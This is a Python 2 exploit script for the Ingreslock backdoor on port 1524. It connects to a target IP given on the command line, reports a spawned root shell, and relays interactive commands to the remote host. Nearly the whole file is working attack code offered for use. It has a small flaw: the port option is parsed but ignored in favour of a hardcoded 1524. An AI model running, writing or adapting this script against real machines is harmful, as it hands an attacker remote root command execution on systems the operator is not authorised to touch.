#! /usr/bin/python

import sys, time
import socket
import signal
import threading
import argparse

###############################################################
# Author : Piyush Raj <0x48piraj>                             #
# Vuln   : Ingreslock backdoor (on port 1524)                 #
###############################################################
# http://www.di-srv.unisa.it/~ads/corso-security/www/CORSO-0203/Scansione_servizi_rete/SAINT_DOCS/tutorials/vulnerability/Vulnerability_Exploits.html

parser = argparse.ArgumentParser(description='Ingreslock backdoor on port 1524')
optional = parser._action_groups.pop() # popped opt args
required_opts = parser.add_argument_group('Required Parameters')
required_opts.add_argument("--target-ip", dest="target", help= "IP Address of the vulnerable machine", required=True)
optional.add_argument("--target-port", dest="port", default=1524, type=int, help= "Port Address of the vulnerable running service")

target, port = parser.parse_args().target, parser.parse_args().port


def recvshell(sock):
    sock.settimeout(3)
    while True:
        try:
            print "\n" + sock.recv(1024).strip() + " ", # for py 3 : print("\n" + sock.recv(1024).strip(), end=' ')
        except socket.timeout:
            pass
        except Exception:
            return

def signal_handler(signal, frame):
        hsocket.close()
        sys.exit(0)

try:
    hsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    hsocket.connect((target, 1524))
    sthread = threading.Thread(target=recvshell, args=(hsocket,))
    sthread.start()
    print ('[*] Root Shell Spawned!\n')
    while True:
            command = raw_input().strip() #for py 3 : input()
            if command == "exit":
                hsocket.close()
                sys.exit()
            hsocket.send(command + '\n')

except Exception:
    signal.signal(signal.SIGINT, signal_handler)
    # BUG: freezes on ctrl+c
    # FIXME: handling keyboard interrupts


    
